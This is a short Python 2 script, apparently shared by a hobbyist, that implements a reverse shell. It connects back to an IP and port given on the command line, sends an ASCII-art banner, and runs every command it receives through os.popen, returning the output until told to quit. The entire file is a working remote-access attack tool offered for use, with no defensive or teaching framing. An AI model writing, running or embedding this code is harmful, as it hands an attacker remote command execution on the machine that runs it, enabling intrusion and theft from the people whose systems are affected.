#!/usr/bin/env python
# A reverse shell in Python written by my friend Pi
# Because i think its cool :p

import os, socket, sys

#Provide geenral usage statement fo rnewbies
def usage():
    print '''
    +----------------------------+	
    |    scriptname.py IP PORT   |
    |--------e-x-a-m-p-l-e-------|
    | script.py 192.168.1.2 9999 |
    +----------------------------+''',exit()

#Put down an interupt catcher
def signalHandler(signal, frame):
    print("[!] CTRL+C received [!] shutting down now...");
    sys.exit()   


if len(sys.argv) < 3:usage()

#Establish our throw back using IP and PORT passed at run time
s=socket.socket()
s.connect((sys.argv[1],int(sys.argv[2])))
#Print pretty banner upon connect in

s.send('''
                                         __
       ___ ___ _         _ ___          |  |
   ___|   |   | |_ ___ _| |   |_ _ _ ___|  |
  |  _| | | | |  _|___| . | | | | | |   |__|
  |_| |___|___|_|     |___|___|_____|_|_|__|

A Python Reverse Shell                  By: Pi


Type "exit" to exit the shell\n[r00t-d0wn]cmd>''')

while 1:
    data = s.recv(512)
    if data.lower()=="q":
        s.close()
        break;
    else:
        if data.startswith('exit'):
        	s.close()
	        break;
        else:
            result=os.popen(data).read()
    if (data.lower() != "q"):
            s.send(str(result)+"[r00t-d0wn]cmd>")
    else:
        s.send(str(result))
        s.close()
        break;
exit()
